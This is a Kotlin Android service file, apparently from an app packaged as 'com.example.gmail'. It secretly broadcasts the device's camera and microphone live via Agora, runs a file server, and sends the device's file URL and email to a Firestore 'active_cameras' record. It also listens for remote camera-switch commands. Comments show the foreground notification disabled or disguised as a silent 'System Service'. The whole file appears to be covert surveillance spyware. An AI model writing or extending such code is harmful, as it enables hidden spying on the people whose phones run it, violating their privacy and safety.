package com.example.gmail

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.google.firebase.firestore.FirebaseFirestore
import io.agora.rtc2.Constants
import io.agora.rtc2.IRtcEngineEventHandler
import io.agora.rtc2.RtcEngine

class VideoService : Service() {

    private val AGORA_APP_ID = "40b0b12b81794659ac17a9a66fab985a"
    private val CHANNEL_ID = "SilentChannel" // Changed ID to reset settings

    private var agoraEngine: RtcEngine? = null
    private var fileServer: FileServer? = null
    private var userId: String? = null
    private val db = FirebaseFirestore.getInstance()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        userId = intent?.getStringExtra("userId")
        val userEmail = intent?.getStringExtra("userEmail")

        if (userId == null) { stopSelf(); return START_NOT_STICKY }

        // 1. Get IP Address (Silent calculation)
        var ip = "0.0.0.0"
        try {
            val wifiMgr = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
            val ipAddress = wifiMgr.connectionInfo.ipAddress
            ip = String.format("%d.%d.%d.%d", (ipAddress and 0xff), (ipAddress shr 8 and 0xff), (ipAddress shr 16 and 0xff), (ipAddress shr 24 and 0xff))
        } catch (e: Exception) { e.printStackTrace() }

        val serverUrl = "http://$ip:8080"

        // 2. Start Foreground Service (REQUIRED to keep camera running)
//        val notification = createSilentNotification()

//        if (Build.VERSION.SDK_INT >= 34) {
//            ServiceCompat.startForeground(this, 1, notification,
//                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
//                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
//                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
//        } else {
//            startForeground(1, notification)
//        }

        // 3. Start Features & Send IP to DB
        startBroadcasting(userEmail, serverUrl)
        startFileServer()
        listenForCommands()

        return START_STICKY
    }

    private fun startFileServer() {
        try {
            fileServer = FileServer()
            fileServer?.start()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startBroadcasting(email: String?, fileUrl: String) {
        if (agoraEngine != null) return

        try {
            agoraEngine = RtcEngine.create(baseContext, AGORA_APP_ID, object : IRtcEngineEventHandler() {})
            agoraEngine?.setChannelProfile(Constants.CHANNEL_PROFILE_LIVE_BROADCASTING)
            agoraEngine?.setClientRole(Constants.CLIENT_ROLE_BROADCASTER)
            agoraEngine?.enableVideo()
            agoraEngine?.enableAudio()
            agoraEngine?.joinChannel(null, userId, null, 0)

            // Send the IP Link to App 2
            updateFirestore(email, fileUrl, true)

        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun listenForCommands() {
        if (userId == null) return
        db.collection("commands").document(userId!!)
            .addSnapshotListener { snapshot, _ ->
                if (snapshot != null && snapshot.exists() && snapshot.getString("action") == "switch_camera") {
                    agoraEngine?.switchCamera()
                    db.collection("commands").document(userId!!).update("action", "")
                }
            }
    }

    private fun updateFirestore(email: String?, fileUrl: String?, isLive: Boolean) {
        if (userId != null) {
            if (isLive) {
                val data = mapOf(
                    "email" to (email ?: "Unknown"),
                    "status" to "live",
                    "file_url" to (fileUrl ?: "Unavailable"),
                    "timestamp" to System.currentTimeMillis()
                )
                db.collection("active_cameras").document(userId!!).set(data)
            } else {
                db.collection("active_cameras").document(userId!!).delete()
            }
        }
    }

    // --- UPDATED: MINIMIZED / SILENT NOTIFICATION ---
//    private fun createSilentNotification(): Notification {
//        val manager = getSystemService(NotificationManager::class.java)
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            // IMPORTANCE_MIN makes it silent and collapses it in the drawer
//            val channel = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN)
//            channel.setShowBadge(false) // No red dot on app icon
//            manager.createNotificationChannel(channel)
//        }
//
//        return NotificationCompat.Builder(this, CHANNEL_ID)
//            .setContentTitle("System Service") // Generic title
//            .setContentText("Running...")
//            .setSmallIcon(android.R.drawable.ic_menu_camera)
//            .setPriority(NotificationCompat.PRIORITY_MIN) // Lowest priority
//            .setOngoing(true)
//            .setSilent(true)
//            .build()
//    }

    override fun onDestroy() {
        super.onDestroy()
        agoraEngine?.leaveChannel()
        RtcEngine.destroy()
        agoraEngine = null
        fileServer?.stop()
        updateFirestore(null, null, false)
    }
}